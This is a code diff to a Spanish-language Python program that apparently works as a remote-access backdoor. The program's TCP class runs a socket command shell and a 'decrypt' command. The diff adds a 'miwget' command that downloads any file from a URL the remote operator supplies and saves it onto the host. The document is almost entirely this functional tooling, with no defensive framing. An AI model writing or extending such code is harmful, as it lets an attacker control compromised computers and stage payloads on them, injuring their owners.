@@ -4,6 +4,7 @@ import getpass
 import re
 import pickle
 import struct
+import requests
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
@@ -403,6 +404,43 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
+    def wget(self, cmd):
+        extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
+            "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
+        extensionesUpper = [i.upper() for i in extensiones]
+        if re.search("-n", cmd):
+            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
+            nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        else:
+            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            valido = False
+            i = 0
+            while i < len(extensiones):
+                if re.search(f"[.]{extensiones[i]}", url):
+                    valido = True
+                    ext = extensiones[i]
+                    break
+                if re.search(f"[.]{extensionesUpper[i]}", url):
+                    valido = True
+                    ext = extensionesUpper[i]
+                    break
+                i += 1
+
+            nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
+            nombre = nombre.split('/')[-1]
+
+        try:
+            req = requests.get(url)
+
+            with open(nombre, 'wb') as archivo:
+                archivo.write(req.content)
+            archivo.close()
+
+            self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())
+
+        except:
+            self.__sock.send(f"error: Error al descargar el archivo".encode())
+
     def shell(self):
         try:
             while True:
@@ -490,6 +528,13 @@ class TCP:
                 elif cmd.lower()[:7] == "decrypt":
                     try:
                         self.decrypt(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:6] == "miwget":
+                    try:
+                        self.wget(cmd)
 
                     except:
                         continue
